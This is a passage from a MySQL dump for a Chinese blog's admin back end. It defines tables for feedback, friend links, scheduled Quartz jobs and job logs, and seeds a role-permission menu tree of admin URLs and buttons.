  `title` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '标题',
  `content` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '详细内容',
  `img_url` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '图片地址',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '添加时间',
  `type` int(1) NOT NULL COMMENT '反馈类型 1:需求 2：缺陷',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_feed_back
-- ----------------------------

-- ----------------------------
-- Table structure for b_friend_link
-- ----------------------------
DROP TABLE IF EXISTS `b_friend_link`;
CREATE TABLE `b_friend_link`  (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '主键ID',
  `name` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '网站名称',
  `url` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '网站地址',
  `avatar` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '网站头像地址',
  `info` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '网站描述',
  `email` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '邮箱',
  `reason` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '下架原因',
  `sort` int(11) NULL DEFAULT 0 COMMENT '排序',
  `status` int(11) NOT NULL DEFAULT 0 COMMENT 'ENUM-状态:\"0-待审核\",\"1-通过\"',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '修改时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '友情链接表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_friend_link
-- ----------------------------
INSERT INTO `b_friend_link` VALUES (1, '儒林小栈', 'https://www.codescholar.cn', 'http://img.codescholar.cn/9a0a3a57c52d409f8a1f9fe5b27077d2.jpg', '言念君子，温其如玉。', '1055826438@qq.com', '', 1, 2, '2023-04-20 11:53:31', '2023-04-20 17:28:16');

-- ----------------------------
-- Table structure for b_job
-- ----------------------------
DROP TABLE IF EXISTS `b_job`;
CREATE TABLE `b_job`  (
  `job_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '任务ID',
  `job_name` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL DEFAULT '' COMMENT '任务名称',
  `job_group` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL DEFAULT 'DEFAULT' COMMENT '任务组名',
  `invoke_target` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '调用目标字符串',
  `cron_expression` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '' COMMENT 'cron执行表达式',
  `misfire_policy` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '3' COMMENT '计划执行错误策略（1立即执行 2执行一次 3放弃执行）',
  `concurrent` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '1' COMMENT '是否并发执行（0允许 1禁止）',
  `status` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '0' COMMENT '状态（0正常 1暂停）',
  `create_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '' COMMENT '创建者',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `update_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '' COMMENT '更新者',
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  `remark` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '' COMMENT '备注信息',
  PRIMARY KEY (`job_id`, `job_name`, `job_group`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 8 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '定时任务调度表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_job
-- ----------------------------
INSERT INTO `b_job` VALUES (1, '自动更新文章阅读数', 'DEFAULT', 'blogQuartz.updateReadQuantity', '0 0 4 * * ?', '3', '1', '0', '程序儒', '2023-04-20 17:16:40', '', NULL, '');
INSERT INTO `b_job` VALUES (2, '系统默认（无参）', 'DEFAULT', 'blogQuartz.ryNoParams', '0/10 * * * * ?', '3', '1', '1', '程序儒', '2023-04-20 09:09:21', '', NULL, '');
INSERT INTO `b_job` VALUES (3, '系统默认（有参）', 'DEFAULT', 'blogQuartz.ryParams(\'ry\')', '0/15 * * * * ?', '3', '1', '1', '程序儒', '2023-04-20 09:09:21', '', NULL, '');
INSERT INTO `b_job` VALUES (6, '定时修改标签的点击量', 'DEFAULT', 'blogQuartz.autoTagsClickVolume', '0 0 3 * * ?', '0', '1', '0', '程序儒', '2023-04-20 15:37:20', '', NULL, '1');
INSERT INTO `b_job` VALUES (7, '定时删除当天验证通过的ip', 'DEFAULT', 'blogQuartz.removeCode', '0 30 23 * * ?', '0', '1', '0', '程序儒', '2023-04-20 16:39:42', '', NULL, '1');

-- ----------------------------
-- Table structure for b_job_log
-- ----------------------------
DROP TABLE IF EXISTS `b_job_log`;
CREATE TABLE `b_job_log`  (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '任务日志ID',
  `job_id` bigint(20) NOT NULL COMMENT '任务ID',
  `job_name` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '任务名称',
  `job_group` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '任务组名',
  `invoke_target` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '调用目标字符串',
  `job_message` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '日志信息',
  `status` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '0' COMMENT '执行状态（0正常 1失败）',
  `exception_info` varchar(2000) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '' COMMENT '异常信息',
  `create_time` datetime NULL DEFAULT NULL COMMENT '创建时间',
  `start_time` datetime NULL DEFAULT NULL COMMENT '开始时间',
  `stop_time` datetime NULL DEFAULT NULL COMMENT '结束时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '定时任务调度日志表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_job_log
-- ----------------------------

-- ----------------------------
-- Table structure for b_menu
-- ----------------------------
DROP TABLE IF EXISTS `b_menu`;
CREATE TABLE `b_menu`  (
  `id` int(10) NOT NULL AUTO_INCREMENT COMMENT '主键',
  `parent_id` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '上级资源ID',
  `url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'url',
  `component` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '资源编码',
  `title` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '资源名称',
  `level` int(11) NULL DEFAULT NULL COMMENT '资源级别',
  `sort_no` int(11) NULL DEFAULT NULL COMMENT '排序',
  `icon` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '资源图标',
  `type` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '类型 menu、button',
  `remarks` varchar(500) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '备注',
  `created_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  `redirect` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '重定向地址',
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '跳转地址',
  `hidden` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '是否隐藏',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 290 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '系统管理-权限资源表 ' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_menu
-- ----------------------------
INSERT INTO `b_menu` VALUES (1, '0', '/system', 'Layout', '系统管理', 0, 4, 'el-icon-setting', 'menu', '', '2023-04-20 22:54:39', NULL, '/system/menu', 'system', '1');
INSERT INTO `b_menu` VALUES (2, '1', '/role', '/system/role', '角色管理', 1, 2, 'el-icon-user-solid', 'menu', '', '2023-04-20 22:54:42', NULL, '', 'role', '1');
INSERT INTO `b_menu` VALUES (3, '2', '/system/role/list', NULL, '列表', 2, NULL, NULL, 'btn', NULL, '2023-04-20 22:54:46', NULL, '', NULL, '0');
INSERT INTO `b_menu` VALUES (4, '2', '/system/role/queryUserRole', NULL, '获取当前登录用户所拥有的权限', 2, NULL, NULL, 'btn', NULL, '2023-04-20 22:54:58', NULL, '', NULL, '0');
INSERT INTO `b_menu` VALUES (5, '2', '/system/role/update', '/system/role/update', '修改', 2, NULL, NULL, 'btn', '', '2023-04-20 22:55:01', NULL, '', NULL, '0');
INSERT INTO `b_menu` VALUES (6, '2', '/system/role/remove', '/system/role/update', '删除', 2, NULL, NULL, 'btn', '', '2023-04-20 22:55:06', NULL, '', NULL, '0');
INSERT INTO `b_menu` VALUES (7, '2', '/system/role/create', NULL, '添加', 2, 1, NULL, 'btn', NULL, '2023-04-20 22:55:09', NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (8, '1', '/menu', '/system/menu', '菜单管理', 1, 5, 'el-icon-menu', 'menu', NULL, '2023-04-20 22:55:12', NULL, '', 'menu', '1');
INSERT INTO `b_menu` VALUES (9, '8', '/system/menu/getMenuTree', NULL, '列表', 2, NULL, NULL, 'btn', NULL, '2023-04-20 22:55:15', NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (10, '8', '/system/menu/create', NULL, '添加', 2, NULL, NULL, 'btn', NULL, '2023-04-20 22:55:28', NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (11, '8', '/system/menu/update', '/system/menu/update', '修改', 2, 2, NULL, 'btn', NULL, '2023-04-20 22:55:31', NULL, NULL, '/system/menu/update', '0');
INSERT INTO `b_menu` VALUES (12, '8', '/system/menu/getMenuList', NULL, '获取所有的url', 2, 6, NULL, 'btn', NULL, '2023-04-20 22:55:33', NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (13, '8', '/system/menu/remove', '/system/menu/remove', '删除', 2, NULL, NULL, 'btn', '', '2023-04-20 22:55:48', NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (14, '1', '/user', '/system/user', '用户管理', 1, 1, 'el-icon-user', 'menu', NULL, '2023-04-20 22:55:50', NULL, NULL, 'user', '1');
INSERT INTO `b_menu` VALUES (15, '14', '/system/user/list', '', '列表', 2, NULL, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (16, '14', '/system/user/remove', '', '删除', 2, NULL, NULL, 'btn', '', '2023-04-20 22:55:54', NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (17, '14', '/system/user/create', '', '添加', 2, NULL, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (18, '14', '/system/user/update', '', '修改', 2, NULL, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (19, '14', '/system/user/info', '', '详情', 2, NULL, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (20, '14', '/system/user/getUserMenu', '', '获取用户权限', 2, NULL, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (21, '14', '/system/user/updatePassword', '', '修改密码', 2, NULL, NULL, 'btn', NULL, NULL, NULL, NULL, '/system/user/update_password', '0');
INSERT INTO `b_menu` VALUES (22, '14', '/generateCode', NULL, '生成用户邀请码', 2, 5, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (23, '14', '/system/user/logout', '', '退出登录', 2, NULL, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (24, '1', '/api', '/system/api', '接口管理', 1, 4, 'el-icon-edit', 'menu', NULL, NULL, NULL, NULL, 'api', '1');
INSERT INTO `b_menu` VALUES (25, '24', '/system/menu/getMenuApi', '', '列表', 2, 1, '1', 'btn', NULL, NULL, NULL, NULL, '', '0');
INSERT INTO `b_menu` VALUES (26, '0', '/articles', 'Layout', '文章管理', 0, 1, 'el-icon-document-copy', 'menu', NULL, NULL, NULL, '/articles/index', '', '1');
INSERT INTO `b_menu` VALUES (27, '26', 'index', '/articles/index', '文章管理', 1, 1, 'el-icon-notebook-2', 'menu', NULL, NULL, NULL, '/articles/index', 'Articles', '1');
INSERT INTO `b_menu` VALUES (28, '27', '/system/article/list', '', '列表', 2, NULL, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (29, '27', '/system/article/delete', '', '删除', 2, NULL, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (30, '27', '/system/article/update', '', '修改', 2, NULL, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (31, '27', '/system/article/add', '', '添加', 2, NULL, NULL, 'btn', NULL, NULL, NULL, NULL, '2', '0');
INSERT INTO `b_menu` VALUES (32, '27', '/system/article/info', '', '详情', 2, NULL, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (33, '27', '/system/article/baiduSeo', '', 'SEO', 2, NULL, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (35, '26', 'tags', '/articles/tags', '标签管理', 1, 2, 'el-icon-collection-tag', 'menu', NULL, NULL, NULL, NULL, 'Tags', '1');
INSERT INTO `b_menu` VALUES (36, '35', '/system/tags/list', NULL, '列表', 2, NULL, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (37, '35', '/system/tags/add', '', '新增', 2, NULL, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (38, '35', '/system/tags/info', '', '详情', 2, NULL, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (39, '35', '/system/tags/update', '', '修改', 2, NULL, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (40, '35', '/system/tags/remove', '/sys/tags/remove', '删除', 2, NULL, NULL, 'btn', NULL, NULL, NULL, NULL, '/sys/tags/remove', '0');
INSERT INTO `b_menu` VALUES (41, '0', '/site', 'Layout', '网站管理', 0, 2, 'el-icon-guide', 'menu', NULL, NULL, NULL, '/friendLink/index', '', '1');
INSERT INTO `b_menu` VALUES (47, '245', '/messages', '/news/message', '留言管理', 1, 2, 'el-icon-message', 'menu', NULL, NULL, NULL, '/message/index', '/message', '1');
INSERT INTO `b_menu` VALUES (48, '47', '/system/message/list', '', '列表', 2, NULL, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (49, '47', '/system/message/remove', NULL, '删除', 2, 1, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (50, '47', 'test', NULL, '回复', 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (51, '41', 'friendLink', '/site/friendLink/index', '友情链接', 1, 3, 'el-icon-link', 'menu', NULL, NULL, NULL, NULL, 'friendLink', '1');
INSERT INTO `b_menu` VALUES (52, '51', '/system/friend/list', NULL, '列表', 2, NULL, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (53, '51', '/system/friend/create', NULL, '添加', 2, 1, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (54, '51', '/system/friend/update', NULL, '修改', 2, 1, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (55, '51', '/system/friend/remove', NULL, '删除', 2, 1, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (56, '0', '/logs', 'Layout', '日志管理', 0, 10, 'el-icon-document', 'menu', NULL, NULL, NULL, NULL, NULL, '1');
INSERT INTO `b_menu` VALUES (57, '56', 'userLog', '/logs/userLog', '用户日志', 1, 1, 'el-icon-coordinate', 'menu', NULL, NULL, NULL, NULL, 'userLogs', '1');
INSERT INTO `b_menu` VALUES (58, '57', '/system/userLog/list', '', '列表', 2, NULL, '', 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (59, '56', 'adminLog', '/logs/adminLog', '操作日志', 1, 2, 'el-icon-magic-stick', 'menu', NULL, NULL, NULL, NULL, 'adminLog', '1');
INSERT INTO `b_menu` VALUES (60, '59', '/system/adminLog/list', '/sys/adminLog/query_log', '列表', 2, NULL, NULL, 'btn', NULL, NULL, NULL, NULL, '/zwblog/adminLog', '0');
INSERT INTO `b_menu` VALUES (61, '56', 'exceptionLog', '/logs/exceptionLog', '异常日志', 1, 3, 'el-icon-cpu', 'menu', NULL, NULL, NULL, NULL, 'exceptionLog', '1');
INSERT INTO `b_menu` VALUES (62, '61', '/system/exceptionLog/list', '/sys/exceptionLog/query_log', '列表', 2, NULL, NULL, 'btn', NULL, NULL, NULL, NULL, '/sys/exceptionLog/query_log', '0');
INSERT INTO `b_menu` VALUES (63, '0', '/other', 'Layout', '其他', 0, 9, 'el-icon-more-outline', 'menu', NULL, NULL, NULL, NULL, 'other', '0');
INSERT INTO `b_menu` VALUES (64, '63', '/image', '/image', '图片管理', 1, 1, 'el-icon-picture-outline', 'menu', NULL, NULL, NULL, NULL, '/image', '0');
INSERT INTO `b_menu` VALUES (65, '64', '/file/delBatchFile', '', '删除', 2, NULL, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (66, '63', '/home', '', '首页', 1, NULL, 'el-icon-s-home', 'menu', '', NULL, NULL, NULL, 'home', '0');
INSERT INTO `b_menu` VALUES (67, '66', '/system/home/lineCount', '', '顶部统计信息', 2, NULL, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (164, '0', '/listener', 'Layout', '监控中心', 0, 7, 'el-icon-monitor', 'menu', NULL, NULL, NULL, NULL, 'listener', '1');
INSERT INTO `b_menu` VALUES (165, '164', '/server', '/listener/server', '服务监控', 1, 1, 'el-icon-light-rain', 'menu', NULL, NULL, NULL, NULL, 'server', '1');
INSERT INTO `b_menu` VALUES (166, '165', '/system/home/systemInfo', NULL, '查看', 2, 1, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (169, '41', '/dict', '/site/dict/index', '字典管理', 1, 1, 'el-icon-heavy-rain', 'menu', NULL, NULL, NULL, NULL, 'dict', '1');
INSERT INTO `b_menu` VALUES (170, '169', '/system/dict/list', NULL, '列表', 2, 1, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (171, '41', '/dictData', '/site/dict/data', '字典数据', 1, 2, 'el-icon-sunset', 'menu', NULL, NULL, NULL, NULL, 'dictData', '0');
INSERT INTO `b_menu` VALUES (172, '171', '/system/dictData/list', NULL, '列表', 2, 1, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (173, '169', '/system/dict/add', NULL, '添加', 2, 1, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (174, '169', '/system/dict/update', NULL, '修改', 2, 2, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (175, '171', '/system/dictData/getDataByDictType', NULL, '类型集合字典数据', 2, 2, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (176, '169', '/system/dict/delete', NULL, '删除', 2, 3, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (177, '169', '/system/dict/deleteBatch', NULL, '批量删除', 2, NULL, '4', 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (178, '171', '/system/dictData/add', NULL, '添加', 2, 1, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (179, '171', '/system/dictData/update', NULL, '修改', 2, 2, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (180, '171', '/system/dictData/delete', NULL, '删除', 2, 3, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (181, '171', '/system/dictData/deleteBatch', NULL, '批量删除', 2, 4, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (182, '1', 'systemconfig', '/system/config', '系统配置', 1, 2, 'el-icon-setting', 'menu', NULL, NULL, NULL, NULL, 'systemconfig', '1');
INSERT INTO `b_menu` VALUES (183, '182', '/system/config/getConfig', NULL, '查询', 2, 1, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (184, '182', '/system/config/update', NULL, '修改', 2, 2, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (185, '2', '/system/role/queryRoleId', NULL, '获取该角色所拥有的权限', 2, 1, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (186, '41', 'webConfig', '/site/webConfig/index', '网站配置', 1, 3, 'el-icon-setting', 'menu', NULL, NULL, NULL, NULL, 'webConfig', '1');
INSERT INTO `b_menu` VALUES (187, '186', '/system/webConfig/list', NULL, '查询', 2, 1, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (188, '186', '/system/webConfig/update', NULL, '修改', 2, 1, NULL, 'btn', NULL, NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (189, '35', '/system/tags/deleteBatch', '', '批量删除', 2, 1, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (191, '164', '/quartz', '/listener/quartz', '定时任务', 1, 2, 'el-icon-coordinate', 'menu', '', NULL, NULL, NULL, 'quartz', '1');
INSERT INTO `b_menu` VALUES (192, '191', '/system/job/list', '', '列表', 2, 1, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (193, '191', '/system/job/add', '', '添加', 2, 2, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (194, '191', '/system/job/update', '', '修改', 2, 3, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (195, '191', '/system/job/delete', '', '删除', 2, 4, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (196, '191', '/system/job/run', '', '立即执行', 2, 5, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (197, '191', '/system/job/change', '', '修改状态', 2, 6, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (198, '191', '/system/job/info', '', '详情', 2, 7, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (199, '164', '/jobLog', '/listener/quartz/log', '任务日志', 1, 3, 'el-icon-help', 'menu', '', NULL, NULL, NULL, 'log', '0');
INSERT INTO `b_menu` VALUES (200, '199', '/system/jobLog/list', '', '列表', 2, 1, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (201, '199', '/system/jobLog/deleteBatch', '', '批量删除', 2, 2, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (202, '199', '/system/jobLog/clean', '', '清空', 2, 3, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (203, '191', '/system/job/deleteBatch', '', '批量删除', 2, 8, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (215, '27', '/system/article/reptile', '', '爬虫', 2, 6, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (216, '35', '/system/tags/top', '', '标签置顶', 2, 5, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (217, '41', '/pages', '/site/page', '页面管理', 1, 3, 'el-icon-document-remove', 'menu', '', NULL, NULL, NULL, '/pages', '1');
INSERT INTO `b_menu` VALUES (218, '217', '/system/page/list', '', '列表', 2, 1, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (219, '217', '/system/page/add', '', '新增', 2, 2, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (220, '217', '/system/page/update', '', '修改', 2, 3, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (221, '217', '/system/page/delete', '', '删除', 2, 4, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (223, '26', 'category', '/articles/category', '分类管理', 1, 3, 'el-icon-files', 'menu', '', NULL, NULL, NULL, '/category', '1');
INSERT INTO `b_menu` VALUES (224, '223', '/system/category/list', '', '列表', 2, 1, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (225, '223', '/system/category/info', '', '详情', 2, 2, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (226, '223', '/system/category/add', '', '新增', 2, 3, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (227, '223', '/system/category/update', '', '修改', 2, 4, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (228, '223', '/system/category/deleteBatch', '', '批量删除', 2, 5, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (229, '223', '/system/category/top', '', '置顶', 2, 6, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (230, '223', '/system/category/delete', '', '删除', 2, 7, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (231, '249', '/albums', '/site/album/album', '相册列表', 1, 1, 'el-icon-camera', 'menu', '', NULL, NULL, NULL, '/album', '1');
INSERT INTO `b_menu` VALUES (232, '231', '/system/album/list', '', '列表', 2, 1, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (233, '231', '/system/album/info', '', '详情', 2, 2, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (234, '231', '/system/album/add', '', '新增', 2, 3, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (235, '231', '/system/album/update', '', '修改', 2, 4, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (236, '231', '/system/album/delete', '', '删除', 2, 5, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (237, '249', '/photos', '/site/album/photo', '照片管理', 1, 2, 'el-icon-camera', 'menu', '', NULL, NULL, NULL, '/photo', '0');
INSERT INTO `b_menu` VALUES (238, '237', '/system/photo/list', '', '列表', 2, 1, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (239, '237', '/system/photo/info', '', '详情', 2, 2, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
